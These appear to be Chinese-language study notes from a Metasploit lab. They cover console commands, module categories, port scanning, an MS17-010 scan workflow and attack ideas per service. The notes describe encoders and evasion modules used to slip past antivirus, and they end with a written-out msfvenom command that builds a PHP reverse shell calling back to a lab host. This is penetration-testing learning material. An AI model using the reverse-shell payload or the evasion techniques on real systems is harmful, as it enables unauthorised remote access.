---
icon: pen-to-square
date: 2025-03-31
tags: 
title: Metasploit
category:
  - 项目
---
## unset 
### **基本用法**
```bash
unset <选项名称>
```

或取消所有选项：
```bash
unset all
```
## setg

### ** 基本语法**
```bash
setg <选项名称> <值>
```
全局设置，如果想撤销全局设置可以用unsetg
- setg会被模块内的set覆盖

## search
### ** 基本语法**


```bash
search [options] <keyword1> [keyword2] ...
```

**常用选项**：

| 选项              | 说明                                                                   | 示例                        |
| --------------- | -------------------------------------------------------------------- | ------------------------- |
| `-h`            | 查看帮助                                                                 | `search -h`               |
| `type:<类型>`     | 按模块类型过滤（`exploit`, `auxiliary`, `post`, `payload`, `encoder`, `nop`） | `search type:exploit`     |
| `name:<名称>`     | 按模块名称搜索                                                              | `search name:eternalblue` |
| `cve:<CVE编号>`   | 按CVE编号搜索                                                             | `search cve:2017-0144`    |
| `platform:<平台>` | 按目标平台搜索（`windows`, `linux`, `android`）                               | `search platform:windows` |
| `author:<作者>`   | 按作者搜索                                                                | `search author:hdm`       |
## 查看辅助模块
任何支持模块，例如扫描程序、爬网程序和模糊测试程序，都可以在此处找到。

```bash
tree -L 1 auxiliary
```
以树状结构
**输出示例**：

复制
```bash
auxiliary
├── admin
├── analyze
├── client
├── cloud
├── crawler
├── dos
├── fileformat
├── fuzzers
├── gather
├── scanner
├── server
└── sniffer
```
- 这里列出了 `auxiliary` 下所有 **一级子目录**（如 `scanner`、`dos`、`admin` 等），每个目录代表一类辅助模块。
这是虚拟目录，不真实存在

## 编码

编码器将允许您对漏洞利用和有效负载进行编码，希望基于签名的防病毒解决方案可能会错过它们。
## 规避
虽然编码器将对有效负载进行编码，但不应将其视为逃避防病毒软件的直接尝试。另一方面，“闪避”模块会尝试这一点，或多或少会成功。  


```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/ evasion/ 
└── windows 
├── applocker_evasion_install_util.rb 
├── applocker_evasion_msbuild.rb 
├── applocker_evasion_presentationhost.rb 
├── applocker_evasion_regasm_regsvcs.rb 
├── applocker_evasion_workflow_compiler.rb 
├── process_herpaderping.rb 
├── syscall_inject.rb 
├── windows_defender_exe.rb 
└── windows_defender_js_hta.rb 

1 directory, 9 files
```

## 利用

漏洞利用，按目标系统进行分类。

```markup
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

20 directories, 4 files
```
## NOP

NOPs （No OPeration） 从字面上看什么也不做。它们在 Intel x86 CPU 系列中具有 0x90，之后 CPU 在一个周期内将不执行任何作。它们通常用作缓冲区，以实现一致的有效载荷大小。


```markup
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

10 directories, 0 files
```

Metasploit拥有许多扫描端口的模块
```bash
msf6 > search portscan Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/wordpress_pingback_access normal No Wordpress Pingback Locator 1 auxiliary/scanner/natpmp/natpmp_portscan normal No NAT-PMP External Port Scanner 2 auxiliary/scanner/portscan/ack normal No TCP ACK Firewall Scanner 3 auxiliary/scanner/portscan/ftpbounce normal No FTP Bounce Port Scanner 4 auxiliary/scanner/portscan/syn normal No TCP SYN Port Scanner 5 auxiliary/scanner/portscan/tcp normal No TCP Port Scanner 6 auxiliary/scanner/portscan/xmas normal No TCP "XMas" Port Scanner 7 auxiliary/scanner/sap/sap_router_portscanner normal No SAPRouter Port Scanner
```
同样也可以用show option进行设置
- **并发：** 要同时扫描的目标数。
- **port：** 要扫描的端口范围。请注意，这里的 1-1000 与使用 Nmap 和 default 配置。Nmap 将扫描 1000 个最常用的端口，而 Metasploit 将从 1 个开始扫描端口号 设置为 10000。
- **主机：**要扫描的目标或目标网络。
- **线程：**将同时使用的线程数。线程越多，扫描速度就越快。

hosts指令用于查找之前设定的目标ip

可以使用nmap数据库与其他模块进行交互
1. **先使用 `db_nmap` 扫描网络**，获取开放的 445 端口的主机信息。
    
2. **再使用 `auxiliary/scanner/smb/smb_ms17_010` 模块**，针对开放 445 端口的主机进行 MS17-010 漏洞扫描。
具体操作
先用db_nmap扫描端口并输入到数据库、
然后hosts -R从数据库中设置目标host

services查看数nmap据库中的服务信息

漏洞思路
- HTTP：可能托管一个 Web 应用程序，您可以在其中发现 SQL 注入或远程代码执行 （RCE） 等漏洞。
- FTP：可以允许匿名登录并提供对有趣文件的访问。
- SMB：可能容易受到 MS17–010 等 SMB 漏洞的攻击
- SSH：可能具有默认或易于猜测的凭据
- RDP：如果使用了弱凭据，则可能容易受到 Bluekeep 的攻击或允许桌面访问。


```bash
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```
这是一个生成php反弹shell的命令